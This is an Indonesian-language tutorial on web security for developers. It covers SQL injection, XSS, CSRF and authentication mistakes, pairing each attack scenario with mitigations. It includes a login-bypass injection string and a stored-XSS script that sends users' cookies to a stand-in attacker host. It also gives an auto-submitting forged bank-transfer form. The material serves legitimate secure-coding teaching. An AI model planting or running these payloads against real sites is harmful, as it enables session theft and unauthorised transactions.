Satu baris kode yang buruk bukan hanya bisa membuat layar menjadi merah karena error, melainkan bisa membuat perusahaan bangkrut karena jutaan data privasi pengguna bocor. Keamanan (Security) seringkali menjadi topik yang dihindari oleh *Junior Developer* karena dianggap merepotkan dan tidak langsung terlihat efeknya pada UI.

Sebagai *Expert Engineer*, keamanan adalah prinsip fundamental ("Secure by Default"). Materi ini akan membimbing Anda untuk berpikir layaknya seorang peretas (Hacker), agar Anda bisa membangun tembok pertahanan yang mustahil ditembus.

## 1. OWASP Top 10 (Standar Emas Keamanan Web)

OWASP (*Open Worldwide Application Security Project*) adalah yayasan nirlaba yang mendedikasikan diri untuk keamanan perangkat lunak. Setiap beberapa tahun, mereka merilis "OWASP Top 10", yakni daftar 10 celah keamanan paling berbahaya dan paling sering ditemukan di seluruh internet.

Jika Anda sedang menjalani wawancara untuk posisi Senior, kemungkinan besar Anda akan ditanya tentang beberapa poin dari OWASP Top 10 ini. Mari kita bahas celah-celah yang paling krusial.

## 2. Injeksi (Injection)

Injeksi terjadi ketika aplikasi mengirimkan data yang tidak terpercaya (biasanya dari *input* pengguna) ke penerjemah (interpreter) sebagai bagian dari sebuah perintah.

### A. SQL Injection (SQLi)
Ini adalah kerentanan paling klasik. Terjadi ketika *developer* menggabungkan string masukan pengguna secara langsung dengan query SQL.

**Skenario Serangan:**
Anda memiliki halaman login dengan kueri:
```sql
SELECT * FROM users WHERE email = ' + emailInput + ' AND password = ' + passwordInput + '
```
Jika peretas memasukkan `emailInput` sebagai: `admin@website.com' OR '1'='1`
Kueri yang terkirim ke server akan menjadi:
```sql
SELECT * FROM users WHERE email = 'admin@website.com' OR '1'='1' AND password = ''
```
Karena pernyataan `'1'='1'` selalu benar (TRUE), peretas akan otomatis masuk sebagai admin tanpa mengetahui kata sandinya!

**Cara Pertahanan (Mitigasi):**
Selalu gunakan *Parameterized Queries* atau gunakan *Object-Relational Mapping* (ORM) seperti Prisma (lihat Modul 19). ORM secara otomatis akan menetralisir karakter-karakter aneh dari *input* pengguna.

## 3. XSS (Cross-Site Scripting)

Jika SQLi menyerang Database, maka XSS adalah serangan yang menargetkan Browser milik pengguna lain.

XSS terjadi ketika sebuah aplikasi memasukkan data yang tidak divalidasi ke dalam halaman web yang dikirim ke browser pengguna lain. Ini memungkinkan peretas untuk menjalankan *script* JavaScript jahat di browser milik korban.

**Skenario Serangan (Stored XSS):**
1. Peretas menulis komentar di blog Anda: `<script>fetch('http://hacker.com/steal?cookie=' + document.cookie)</script>`
2. Komentar ini tersimpan di *database* karena tidak divalidasi.
3. Ribuan pengguna yang tidak bersalah mengunjungi halaman artikel blog Anda.
4. Browser mereka melihat tag `<script>` dan menjalankannya tanpa curiga. Semua data *Cookie* (yang berisi Token Login) mereka terkirim ke server peretas. Peretas kini menguasai ribuan akun.

**Cara Pertahanan (Mitigasi):**
- Di framework modern seperti React/Next.js, ini sebagian besar sudah dicegah. Jika Anda menulis `<div>{comment}</div>`, React secara otomatis mengubah karakter `<` menjadi `&lt;` (proses ini disebut HTML Escaping).
- **BAHAYA:** Jangan pernah menggunakan atribut `dangerouslySetInnerHTML` di React kecuali Anda 100% yakin data tersebut sudah disanitasi menggunakan pustaka pembersih seperti `DOMPurify`.

## 4. CSRF (Cross-Site Request Forgery)

CSRF (baca: Sea-Surf) adalah teknik di mana peretas memaksa browser korban yang sudah *login* (terautentikasi) untuk melakukan tindakan yang tidak diinginkan di aplikasi web yang Anda buat.

**Skenario Serangan:**
1. Anda sudah login di `bankrakyat.com`.
2. Peretas mengirimkan Anda email berisi gambar kucing lucu yang mengarah ke website milik peretas `anakkucing.com`.
3. Di dalam `anakkucing.com`, peretas menyembunyikan form tersembunyi:
```html
<form action="http://bankrakyat.com/api/transfer" method="POST">
  <input type="hidden" name="to" value="RekeningHacker" />
  <input type="hidden" name="amount" value="1000000" />
</form>
<script>document.forms[0].submit();</script>
```
4. Karena Anda kebetulan baru saja login di bank, saat form tersebut ditembakkan secara diam-diam, browser Anda masih menyimpan *Cookie Login* Bank tersebut. Bank melihat *request* valid yang datang dari IP Anda, dan memproses transfer uangnya.

**Cara Pertahanan (Mitigasi):**
- **SameSite Cookies:** Di pengembangan modern, selalu atur setelan Cookie Authentication dengan `SameSite=Strict` atau `Lax`. Ini mencegah browser mengirimkan Cookie jika *request* berasal dari domain yang berbeda.
- **CSRF Tokens:** Tanamkan token acak tersembunyi di setiap form HTML yang Anda buat, dan validasi token tersebut di server.

## 5. Broken Authentication & Session Management

Mengurus Login dan Logout tampaknya sederhana, tetapi sangat mudah hancur jika implementasinya sembarangan.

- **Kata Sandi Tanpa Hashing:** Jangan pernah menyimpan kata sandi dalam bentuk teks terang (Plain Text). Jika database bocor, habislah Anda. Selalu gunakan algoritma "Hashing" yang kuat (seperti `bcrypt` atau `Argon2`). Ingat, Hash bukanlah enkripsi. Enkripsi bisa dikembalikan ke aslinya, Hash adalah proses acak satu arah yang tidak bisa dikembalikan.
- **Token JWT Terekspos:** Jika Anda menggunakan JSON Web Tokens (JWT) untuk API Anda, di mana Anda menyimpannya di Frontend? Menyimpannya di `localStorage` sangat berbahaya karena rentan dicuri melalui serangan XSS. Praktik terbaik adalah menyimpannya di dalam **HttpOnly Cookies**. Cookie berjenis HttpOnly secara fisik diblokir agar tidak bisa dibaca oleh JavaScript (`document.cookie`), sehingga aman dari XSS.

## Kesimpulan

Keamanan bukanlah fitur yang bisa Anda tambahkan di akhir proyek tepat sebelum rilis. Ia adalah pola pikir. Jika Anda ragu, asumsikan bahwa *semua data yang dikirim oleh Klien (browser) adalah niat buruk*. Validasi semuanya, jangan percayai apa pun.
